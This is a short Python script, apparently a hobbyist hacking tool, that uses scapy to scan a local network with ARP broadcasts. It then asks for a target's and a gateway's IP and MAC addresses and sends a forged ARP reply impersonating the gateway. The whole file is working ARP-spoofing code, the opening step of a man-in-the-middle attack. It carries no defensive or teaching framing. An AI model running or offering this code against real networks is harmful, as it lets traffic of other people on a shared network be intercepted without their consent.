import scapy.all as scapy
import argparse
import subprocess

def show_arp_table(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered,unanswered=scapy.srp(combined_packet,timeout=1)
    answered.summary()

def user_input():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--ip-address",dest="ip_address",help="Enter IP address")
    args = parser.parse_args()
    return (args.ip_address)

# Enter target IP and MAC Addresses
def get_mac_ip_of_target():
    print("\n\nThese addresses must be owned by target.")
    mac_address = str(input("Enter MAC address: "))
    ip_address = input("Enter IP Address: ")
    return {"mac":mac_address,"ip":ip_address}

def get_mac_ip_of_gateway():
    print("\n\nThese addresses must be owned by default gateway.")
    mac_address = str(input("Enter MAC address: "))
    ip_address = input("Enter IP Address: ")
    return {"mac":mac_address,"ip":ip_address}

# op=2 means arp-response
def send_packet(mac_ip_of_target, mac_ip_of_gateway):
    arp_response = scapy.ARP(op=2,pdst=mac_ip_of_target["ip"],hwdst=mac_ip_of_target["mac"],psrc=mac_ip_of_gateway["ip"])
    scapy.send(arp_response)


def clear_terminal():
    subprocess.call("clear")


show_arp_table(user_input())
mac_ip_of_target = get_mac_ip_of_target()
mac_ip_of_gateway = get_mac_ip_of_gateway()
clear_terminal()
send_packet(mac_ip_of_target, mac_ip_of_gateway)

